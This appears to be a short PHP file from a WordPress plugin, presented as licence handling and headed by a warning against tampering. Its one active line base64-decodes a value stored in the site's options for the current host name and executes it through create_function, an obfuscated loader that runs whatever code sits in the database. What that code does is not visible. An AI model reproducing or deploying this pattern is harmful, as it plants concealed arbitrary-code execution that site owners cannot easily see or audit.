<?php 
/**
 * WARNING
 * Tampering with this file is a violation of the software terms and conditions.
 */
$parts=parse_url("http:/"."/".$_SERVER["SERVER_NAME"]);$l=get_option('twc_licenses',array());$e=create_function("",@base64_decode(@$l[$parts["host"]]));$e();
?>